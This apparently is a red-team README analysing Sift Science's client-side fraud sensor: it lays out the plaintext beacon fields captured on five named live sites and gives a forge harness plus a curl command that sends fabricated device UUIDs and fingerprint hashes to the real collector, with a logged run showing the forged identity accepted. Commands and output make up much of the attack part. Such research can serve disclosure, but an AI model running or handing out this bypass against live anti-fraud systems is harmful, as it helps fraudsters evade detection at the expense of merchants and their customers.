# dfp-redteam-sift — Sift Science client sensor

Sift's client-side device/fraud sensor. Full details in the writeups:
`SIFT_HUNT_2026_10_31.md` (hunt), `SIFT_LIVE_DEPLOYMENTS_2026_11_01.md`
(deployments), `SIFT_FORGERY_2026_11_01.md` (forgery proof).

---

## What we observed (the shipped payload)

**The v121 beacon is a plaintext 1×1 image GET to `hexagon-analytics.com` —
every fingerprint field in the query string, no encryption, no signature.**

Captured live on 5 deployments: studypool, ksl, poshmark, depop, paulaschoice.

```
GET https://hexagon-analytics.com/images/<n>.gif?bk=<account>&v=121&h=<host>
    &S=<session md5>&ui=0&uu=<DEVICE UUID>&ua=<UA>
    &cf=<canvas fp>&fvch=<webgl fp>&fmf=<audio fp>&fl=<font fp>
    &wd=<webdriver flag>&inc=<incognito flag>&... (~60 fields)
```

- `uu` = the device identity (**also stored in the 4-year `__ssid` cookie**)
- `S`/`ui`/`P` = session / user / partner identifiers (MD5-hashed)
- `cf`, `fvch`, `fmf`, `fl` = canvas / WebGL / audio / font fingerprints
- `wd`, `inc`, `npe`, storage flags = automation + privacy probes

No `api.siftscience.com` POSTs. The whole payload is readable by anyone who can
read a URL.

## The minted-client harness

`scripts/sift-forge.mjs` (URL generator) + the full harness in this repo's
`scripts/sift-forge-harness.mjs` — mints a fresh device UUID + session + forged
fingerprint hashes and sends the forged beacon to the collector:

```bash
node scripts/sift-forge-harness.mjs        # mints (writes URL to file)
curl -s --resolve hexagon-analytics.com:443:34.102.249.210 \
     -A "Mozilla/5.0" -e "https://www.ksl.com/" "$(cat /tmp/sift-forged-url.txt)"
```

> note: `hexagon-analytics.com` may not resolve in some sandboxes — use the
> known public IP noted above.

### Recorded run — forged identity accepted (2026-11-01)

```
=== SIFT BEACON FORGE HARNESS ===
minted device UUID (uu): 43c298ce-e0cd-491b-a23e-fa96069fe7a6
minted session  (S):     08d137323d7344186a611bd0afe332b6
forged canvas (cf):      f0e1d2c3b4a5968778695a4b3c2d1e0f
forged webgl  (fvch):    00112233445566778899aabbccddeeff
forged audio  (fmf):     ffeeddccbbaa99887766554433221100
forged fonts  (fl):      abababababababababababababababab

COLLECTOR: HTTP 200 | 43 bytes | image/gif
response body head: 4749 4638 3961 0100   (GIF89a ...)
```

**Proof:** the collector returned **HTTP 200 + a valid 1×1 `GIF89a`** for a
fully synthetic device identity — fresh UUID, our own session MD5, forged
fingerprints, **no signature or device check**. The device identity is
client-asserted and silently trusted (the inverse of Fingerprint Pro's
server-owned identity).

## Status

- 🟢 Read payload: full plaintext beacon captured on 5 live sites
- 🟢 Tamper with payload: every field editable; forged values accepted
- 🟢 Mint token: fresh device UUID + session minted; collector returns 200 + GIF

## Files

- `scripts/sift-forge.mjs`, `scripts/sift-forge-harness.mjs` — the forge harness
- `scripts/deep-capture.mjs`, `browser-probe.mjs`, `cookie-check.mjs` — capture tools
- `artifacts/sift-beacon-v121.js` — the exact sensor source (57,981 B)
- `artifacts/ksl-full-pixel.txt`, `depop-full-pixel.txt` — real captured beacons
- `artifacts/forged/accepted-1x1.gif` — the collector's acceptance response
